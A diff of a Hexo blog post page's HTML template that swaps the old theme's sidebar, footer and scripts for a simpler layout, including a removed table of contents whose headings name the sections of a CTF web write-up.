-                  <a href="https://github.com/testzero-wz" title="GitHub &rarr; https://github.com/testzero-wz" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+                        <a href="/tag/CTF/"># CTF</a>
+                    
+                        <a href="/tag/WriteUp/"># WriteUp</a>
+                    
+                        
                 </span>
-              
-                <span class="links-of-author-item">
-                  
-                  
-                    
-                  
-                  
-                    
-                  
-                  <a href="mailto:testzero.wz@gmail.com" title="E-Mail &rarr; mailto:testzero.wz@gmail.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
-                </span>
-              
             </div>
-          
-
-          
-
-          
-          
-
-          
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
             
-          
-          
+                <a class="prev" rel="prev" href="/2017/09/27/NSCTF-Web-WriteUp/">NSCTF-Web-WriteUp</a>
+            
+            
+        </section>
+
+
+    </article>
+</div>
 
         </div>
-      </div>
-
-      
-      <!--noindex-->
-        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
-          <div class="post-toc">
-
-            
-            
-            
-            
-
-            
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#web1"><span class="nav-number">1.</span> <span class="nav-text"> WEB1</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web2"><span class="nav-number">2.</span> <span class="nav-text"> WEB2</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#mssql注入"><span class="nav-number">2.1.</span> <span class="nav-text"> MSSQL注入</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web3"><span class="nav-number">3.</span> <span class="nav-text"> WEB3</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#一阶段上传绕过"><span class="nav-number">3.1.</span> <span class="nav-text"> 一阶段――上传绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#有问题变量在模板参数tpl处"><span class="nav-number">3.1.0.0.1.</span> <span class="nav-text"> 有问题变量在模板参数tpl处</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#科普"><span class="nav-number">3.1.1.</span> <span class="nav-text"> 科普</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#尝试"><span class="nav-number">3.1.2.</span> <span class="nav-text"> 尝试</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#分析"><span class="nav-number">3.2.</span> <span class="nav-text"> 分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#比赛宕机"><span class="nav-number">3.3.</span> <span class="nav-text"> 比赛宕机</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#发生了两次宕机其中有一次长达半个多小时比赛才6个小时欲哭无泪"><span class="nav-number">3.3.0.0.0.1.</span> <span class="nav-text"> 发生了两次宕机，其中有一次长达半个多小时，比赛才6个小时欲哭无泪</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#比赛继续"><span class="nav-number">3.4.</span> <span class="nav-text"> 比赛继续</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3389-端口"><span class="nav-number">3.5.</span> <span class="nav-text"> 3389 端口</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#经典后门粘滞键后门"><span class="nav-number">3.5.1.</span> <span class="nav-text"> 经典后门――粘滞键后门</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#至此比赛结束"><span class="nav-number">3.6.</span> <span class="nav-text"> 至此比赛结束</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#总结"><span class="nav-number">3.6.1.</span> <span class="nav-text"> 总结</span></a></li></ol></li></ol></li></ol></div>
-            
-
-          </div>
-        </div>
-      <!--/noindex-->
-      
-
-      
-
+        <!-- 
+<footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© T3stzer0 | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
     </div>
-  </aside>
-  
+</footer>
 
-
-        
-      </div>
-    </main>
-
-    <footer id="footer" class="footer">
-      <div class="footer-inner">
-        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
-  <span class="with-love" id="animate">
-    <i class="fa fa-user"></i>
-  </span>
-  <span class="author" itemprop="copyrightHolder">W z</span>
-
-  
-
-  
-</div>
-
-
-
-
-
-
-
-
-
-        
-<div class="busuanzi-count">
-  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-
-  
-    <span class="post-meta-item-icon">
-    
-      <i class="fa fa-user"></i>
-	  总访客:
-    </span>
-    <span class="site-uv" title="总访客量">
-      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
-    </span>
-  
-
-  
-
-  
-</div>
-
-
-
-
-
-
-
-
-
-        
-      </div>
-    </footer>
-
-    
-      <div class="back-to-top">
-        <i class="fa fa-arrow-up"></i>
-        
-      </div>
-    
-
-    
-
-    
-
-    
-  </div>
-
-  
-
-<script>
-  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
-    window.Promise = null;
-  }
+-->
+    </div>
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
 </script>
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-  
-  <script src="/lib/jquery/index.js?v=2.1.3"></script>
-
-  
-  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
-
-  
-  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
-
-
-  
-
-
-  <script src="/js/src/utils.js?v=7.0.1"></script>
-
-  <script src="/js/src/motion.js?v=7.0.1"></script>
-
-
-
-  
-  
-
-
-  <script src="/js/src/schemes/muse.js?v=7.0.1"></script>
-
-
-
-  
-  <script src="/js/src/scrollspy.js?v=7.0.1"></script>
-<script src="/js/src/post-details.js?v=7.0.1"></script>
-
-
-
-  
-
-
-  <script src="/js/src/next-boot.js?v=7.0.1"></script>
-
-
-  
-
-  
-
-  
-
-  
-
-
-  
-
-
-  
-
-
-
-
-  
-
-  
-
-  
-  
-
-  
-  
-
-  
-
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
+<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-MML-AM_CHTML"></script>
 </body>
 </html>
